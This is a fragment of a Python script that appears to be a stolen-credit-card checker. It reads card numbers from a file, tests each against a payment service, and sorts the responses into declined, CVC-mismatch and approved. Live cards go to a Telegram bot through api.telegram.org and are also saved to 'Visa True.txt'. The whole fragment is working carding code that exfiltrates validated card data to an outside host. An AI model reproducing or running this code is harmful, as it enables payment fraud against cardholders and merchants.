...
for P in file.readlines():
	...
	if ('Your card was declined.' in response.text):
		...
		print('[',nm,']',Z,P,'حساب غير صالح.')
			
							
	elif 'Your card number is incorrect.' in response.text:
		print('[',nm,']',Z,P,'رقم بطاقتك غير صحيح.')
				
												
	elif "Your card's expiration month is invalid." in response.text:
		print('[',nm,']',Z,P,'شهر انتهاء صلاحية بطاقتك غير صالح.')
			
			
	elif 'The Month field must contain a number greater than or equal to 1.' in response.text:
		print(Z,P,'The Month field must contain a number greater than or equal to 1.')
			
			
	elif 'The Month field must contain a number less than or equal to 12."' in response.text:
		print(Z,P,'The Month field must contain a number less than or equal to 12."')
			
			
	elif 'incorrect_cvc' in response.text:
		print(Z,P,'ccn 1')
		requests.post(f'https://api.telegram.org/bot{tok2}/sendMessage?chat_id={id}&text={ccn}{P}')
					
		
	elif 'The CVC field must contain only numbers.' in response.text:
		print(Z,P,'ccn 2')
		requests.post(f'https://api.telegram.org/bot{tok2}/sendMessage?chat_id={id}&text={ccn2}{P}')
			
			
	elif 'incomplete' in response.text:			
		print(K,P,'Approved 🤠 ')
		requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text={ap}{P}')	
			
			
	elif "Payment success" in response.text:
		print('[',nm,']',K,P,'الدفع الناجح')
		with open('Visa True.txt', 'a') as x:
			x.write(P+'الدفع الناجح'+'\n=======\n')
						
	elif "Payment Completed." in response.text:
		print('[',nm,']',K,P,'تم التسديد.')
		with open('Visa True.txt', 'a') as x:
			x.write(P+'تم التسديد.'+'\n=======\n')
						
	elif "Thank you for your support." in response.text:
		print('[',nm,']',K,P,'شكرا لدعمكم.')
		with open('Visa True.txt', 'a') as x:
			x.write(P+'شكرا لدعمكم.'+'\n=======\n')
		...
		print('[',nm,']',C,P,'success":true&false')
		with open('Visa True.txt', 'a') as x:
			x.write('false&True:'+response.text+'\n')
		requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text={true}{P}')	
					
	else:
		print('[',nm,']',C,P,' response new')
		with open('Visa True.txt', 'a') as x:
